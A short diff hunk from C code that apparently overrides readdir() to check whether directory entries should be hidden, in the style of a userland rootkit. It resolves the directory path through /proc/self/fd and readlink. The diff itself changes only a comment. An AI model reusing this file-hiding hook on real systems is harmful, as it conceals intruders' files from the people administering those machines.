@@ -24,7 +24,7 @@ struct dirent *readdir(DIR *dirp)
             char fd_path[256], *directory_name = (char *) malloc(sizeof(fd_path));
             memset(directory_name, 0, sizeof(fd_path));
             fd = dirfd(dirp); // get directory's file descriptor location
-            snprintf(fd_path, sizeof(fd_path) - 1, "/proc/self/fd/%d", fd); // append the file descriptor value as full file location
+            snprintf(fd_path, sizeof(fd_path) - 1, "/proc/self/fd/%d", fd); // append the file descriptor value as full file location as the current process' file descriptors
             readlink(fd_path, directory_name, sizeof(fd_path) - 1); // finally, get the full path of current directory
 
             snprintf(path, PATH_MAX, "%s/%s", directory_name, dir->d_name); // finalize the string, CHECK IF THE SHIT'S HIDDEN
